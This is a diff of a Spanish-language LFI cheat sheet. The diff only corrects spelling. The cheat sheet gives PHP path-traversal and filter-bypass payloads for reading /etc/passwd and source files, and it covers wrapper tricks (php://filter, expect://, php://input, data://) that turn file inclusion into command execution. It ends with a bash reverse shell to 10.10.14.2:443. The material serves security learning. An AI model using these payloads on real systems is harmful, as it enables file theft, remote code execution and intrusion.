@@ -17,9 +17,9 @@ A continuación, se os proporciona el enlace directo a la herramienta que utiliz
 -   **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
 
 
-## Metodos de poder hacer un LFI en los diferentes codigos y sanitizaciones.
+## Métodos de poder hacer un LFI en los diferentes códigos y sanitizaciones.
 
-Con un LFI podemos no solo cargar archivos que agreguemos la ruta de la pagina, si no tambien cambiar y ver otras rutas en la pagina web.
+Con un LFI podemos no solo cargar archivos que agreguemos la ruta de la pagina, si no también cambiar y ver otras rutas en la pagina web.
 * **/var/www/html** Ruta de default
 
 Un LFI sin sanitizar
@@ -29,11 +29,11 @@ Un LFI sin sanitizar
 	include($filename);
 ?>
 ```
-Para este codigo sin sanitizar podemos hacer lo siguiente en la **web** y asi cargariamos un archivo:
+Para este código sin sanitizar podemos hacer lo siguiente en la **web** y así cargaríamos un archivo:
 * **index.php?filename=/etc/passwd**
 
 
-Con el codigo sanitizado evitamos lo de arriba.
+Con el código sanitizado evitamos lo de arriba.
 ```php
 <?php
 	$filename = $_GET['filename'];
@@ -43,13 +43,13 @@ Con el codigo sanitizado evitamos lo de arriba.
 	// . = Concatenar
 	// ruta = Que busque el archivo siempre en esa ruta
 ```
-Si colocamos lo mismo de  **index.php?filename=/etc/passwd** en la ruta final obtendriamos:
-**/var/www/html//etc/passwd** -> Por lo que esa ruta no exites y no nos daria nada. 
-Pero podriamos hacer un **Directory Path Traversal** en la **web** de la siguiente manera:
-* **index.php?filename=../../../../../etc/passwd** y asi burlar la sanitizacion ya que tendriamos un **/etc/passwd**
+Si colocamos lo mismo de  **index.php?filename=/etc/passwd** en la ruta final obtendríamos:
+**/var/www/html//etc/passwd** -> Por lo que esa ruta no existe y no nos daría nada. 
+Pero podríamos hacer un **Directory Path Traversal** en la **web** de la siguiente manera:
+* **index.php?filename=../../../../../etc/passwd** y así burlar la sanitización ya que tendríamos un **/etc/passwd**
 
 
-Sanitizando de nuevo el codigo evitariamos lo de arriba.
+Sanitizado de nuevo el código evitaríamos lo de arriba.
 ```php
 <?php
 	$filename = $_GET['filename'];
@@ -61,13 +61,13 @@ Sanitizando de nuevo el codigo evitariamos lo de arriba.
 	// ruta = Que busque el archivo siempre en esa ruta
 	// str_replace = Donde vea ../ lo convierta a nada 
 ```
-Si hacemos de nuevo un Directory Path Traversal de la manera normal obtendriamos lo siguiente:
+Si hacemos de nuevo un Directory Path Traversal de la manera normal obtendríamos lo siguiente:
 **/var/www/html/../../../../../etc/passwd** -> /var/www/htmletc/passwd Y esa ruta no existe
-Pero podriaos burlar esa sanitizacion en la **web** colocandolo de manera doble.
-* **index.php?filename=....//....//....//....//....//etc/passwd** y como resultado final tendriamos **/etc/passwd**
+Pero podríamos burlar esa sanitización en la **web** colocándolo de manera doble.
+* **index.php?filename=....//....//....//....//....//etc/passwd** y como resultado final tendríamos **/etc/passwd**
 
 
-Sanitizando de nuevo el codigo con expresiones regulares evitariamos lo de arriba.
+Sanitizado de nuevo el código con expresiones regulares evitaríamos lo de arriba.
 ```php
 <?php
 	$filename = $_GET['filename'];
@@ -85,12 +85,12 @@ Sanitizando de nuevo el codigo con expresiones regulares evitariamos lo de arrib
 	// str_replace = Donde vea ../ lo convierta a nada 
 	// preg_match = Lo que haga match que seria /etc/passwd, entraria al bucle y no mostraria el contenido 
 ```
-Para poder burlar este tipo de sanitizacion podemos colocar este tipo de input **/etc/././././passwd**, **/etc///passwd**, 
-Pero podriaos burlar esa sanitizacion en la **web** colocandolo mas barras despues del etc o barra y punto.
-* **index.php?filename=....//....//....//....//....//etc/////passwd** y obtendriamos como resultado **/etc/passwd**
-* **index.php?filename=....//....//....//....//....//etc/./././passwd** y obtendriamos como resultado **/etc/passwd**
-Tambien podemos utilizar interrogantes y el sistema nos buscara aun asi el archivo:
-* **index.php?filename=....//....//....//....//....//e??/./././pa???d** y obtendriamos como resultado **/etc/passwd**
+Para poder burlar este tipo de sanitización podemos colocar este tipo de input **/etc/././././passwd**, **/etc///passwd**, 
+Pero podriaos burlar esa sanitizacion en la **web** colocándolo mas barras después del etc o barra y punto.
+* **index.php?filename=....//....//....//....//....//etc/////passwd** y obtendríamos como resultado **/etc/passwd**
+* **index.php?filename=....//....//....//....//....//etc/./././passwd** y obtendríamos como resultado **/etc/passwd**
+También podemos utilizar interrogantes y el sistema nos buscara aun así el archivo:
+* **index.php?filename=....//....//....//....//....//e??/./././pa???d** y obtendríamos como resultado **/etc/passwd**
 
 
 Sanitizando de nuevo el codigo forzando a que busque un archivo .php en la ruta 
@@ -104,19 +104,19 @@ Sanitizando de nuevo el codigo forzando a que busque un archivo .php en la ruta
 
 	// . = Concatenar
 ```
-Esto funciona para las versiones de **PHP menor a la 5.3.8** y lo que podemos hacer para evitar esa extencion es agregar un **NULL BYTE** en la **web** de la siguiente manera:
+Esto funciona para las versiones de **PHP menor a la 5.3.8** y lo que podemos hacer para evitar esa extensión es agregar un **NULL BYTE** en la **web** de la siguiente manera:
 Donde **%00 -> \\0** 
-* **index.php?filename=....//....//....//....//....//etc/passwd%00** y obtendriamos como resultado **/etc/passwd**
-Cuando exista una sanitizacion por numero de caracteres como los ultimos 6 (passwd) o por los ultimos 4 (.txt). Podemos hacer lo siguiente:
-Podriamos agregar un **/.** al final y asi podriamos burlar la sanitizacion. 
-* **index.php?filename=....//....//....//....//....//etc/passwd/.** y obtendriamos como resultado **/etc/passwd**
-* **index.php?filename=....//....//....//....//....//tmp/test.txt/.** y obtendriamos como resultado el archivo **test.txt**
+* **index.php?filename=....//....//....//....//....//etc/passwd%00** y obtendríamos como resultado **/etc/passwd**
+Cuando exista una sanitización por numero de caracteres como los últimos 6 (passwd) o por los últimos 4 (.txt). Podemos hacer lo siguiente:
+Podriamos agregar un **/.** al final y así podríamos burlar la sanitización. 
+* **index.php?filename=....//....//....//....//....//etc/passwd/.** y obtendríamos como resultado **/etc/passwd**
+* **index.php?filename=....//....//....//....//....//tmp/test.txt/.** y obtendríamos como resultado el archivo **test.txt**
 
 ----
 
-Tambien podemos emplear **Groupers** en la url de la Web:
-Este nos ayuda a apuntar a un recurso **(index.php, secret.php, etc...)** y despues mediante una conversion representarlo en base64
-* index.php?page=**php://filter/convert.base64-encode/resource=index.php** y obtendriamos como resultado el index.php pero en base64, despues colocamos el resultado en un archivo **data**
+También podemos emplear **Groupers** en la url de la Web:
+Este nos ayuda a apuntar a un recurso **(index.php, secret.php, etc...)** y después mediante una conversión representarlo en base64
+* index.php?page=**php://filter/convert.base64-encode/resource=index.php** y obtendríamos como resultado el index.php pero en base64, después colocamos el resultado en un archivo **data**
 ```bash
 ❯ cat data | base64 -d | sponge data                             # Sponge = Colocar el output decodificado en el mismo archivo
 ```
@@ -127,8 +127,8 @@ Este nos ayuda a apuntar a un recurso **(index.php, secret.php, etc...)** y desp
 
 
 Otro **Groupers** que podemos usar en la web es el siguiente:
-Este nos ayuda a rotar cada caracter en 13 posiciones
-* index.php?page=**php://filter/read=string.rot13/resource=secret.php** y obtendriamos como resultado algo raro que es el resultado pero rotado 13 caracteres y pegamos el resultado en un archivo **data**
+Este nos ayuda a rotar cada carácter en 13 posiciones
+* index.php?page=**php://filter/read=string.rot13/resource=secret.php** y obtendríamos como resultado algo raro que es el resultado pero rotado 13 caracteres y pegamos el resultado en un archivo **data**
 ```bash
 ❯ cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]' # tr = Nos ayudara a rotar de nuevo las 13 posiciones, empezando por la letra que nos arroje el output (Siempre cambian) 
 
@@ -142,57 +142,57 @@ Este nos ayuda a rotar cada caracter en 13 posiciones
 
 Otro **Groupers** que podemos usar en la web es el siguiente: 
 Este nos ayudaria convertir de UTF-8 a UTF-16:
-* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendriamos como resultado que nos muestre el resultado por la web ya que no lo esta 'interpretando'.
+* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendríamos como resultado que nos muestre el resultado por la web ya que no lo esta 'interpretando'.
 
 
 Otro **Groupers** que podemos usar en la web es el siguiente:
 Este nos ayudara a ejecutar comandos
-* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendriamos como resultado
+* index.php?page=**php://filter/convert.iconv.utf-8.utf-16/resource=secret.php** y obtendríamos como resultado
 
 ### En BurpSuite
 Este **Groupers** lo podemos usar en BurpSuite:
 Nos ayudara a ejecutar comandos
 * POST /?filename=**expect://whoami** HTTP/1.1  
-Obtendriamos el whoami de la maquina (Si es que esta habilitado)
+Obtendríamos el whoami de la maquina (Si es que esta habilitado)
 
 
 Este **Groupers** lo podemos usar en BurpSuite:
 Nos ayudara a ejecutar comandos
 * POST /?filename=**php://input** HTTP/1.1 
-Obtendriamos el comando que nosotros le pasemos (whoami, id, etc...)
+Obtendríamos el comando que nosotros le pasemos (whoami, id, etc...)
 ```php
 <?php system("whoami"); ?>              # Esta parte se pone al final de la peticion en BurpSuite
 ```
 
 
 Este **Groupers** lo podemos usar en BurpSuite:
-Nos ayudara a ejecutar comandos, pasandole un comando que este encodeado en base64
+Nos ayudara a ejecutar comandos, pasándole un comando que este encodeado en base64
 ```php
 <?php system("whoami"); ?>        # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4=
 ```
 * GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4= HTTP/1.1 
-Obtendriamos el comando que nosotros le pasemos (whoami, id, etc...)
+Obtendríamos el comando que nosotros le pasemos (whoami, id, etc...)
 
 
 Este **Groupers** lo podemos usar en BurpSuite:
-Para controlar el comando que querramos injectar.
+Para controlar el comando que queramos inyectar.
 ```php
 <?php system($_GET["cmd"]); ?>         # Lo codificamos en base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+, debemos de url-encodear el + = %2b
 ```
 * GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=whoami HTTP/1.1 
 * GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami HTTP/1.1  -> La manera correcta 
-Debemos de colocar al final **&cmd=comando** y es ahi donde podriamos colocar cualquier comando 
+Debemos de colocar al final **&cmd=comando** y es ahí donde podríamos colocar cualquier comando 
 
 
 ### PHP Filter Chain Generator
 
-Podemos usar el siguiente comando y nos lo hara automaticamente con la tool.
+Podemos usar el siguiente comando y nos lo hará automáticamente con la tool.
 
 ```bash
 ❯ python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'     # Nos crea la expresion 
 ```
 Esto es en la url de la web.
-* localhost?filename='Aqui colocamos el resultado del comando anterior'   
+* localhost?filename='Aquí colocamos el resultado del comando anterior'   
 Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.
 
 
@@ -201,7 +201,7 @@ Para controlar el comando a ejecutar.
 ❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'     # Nos crea la expresion, & lo debemos de url-encodear = %26
 ```
 Esto es en la url de la web.
-* localhost?filename='Aqui colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
-* localhost?filename='Aqui colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"     -> La manera correcta
+* localhost?filename='Aquí colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"
+* localhost?filename='Aquí colocamos el resultado del comando anterior'&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"     -> La manera correcta
 Podemos ejecutar comandos. Es una forma mas avanzada de hacerlo.
 Debemos de colocar al final **&cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"** y es ahi donde podriamos colocar cualquier comando
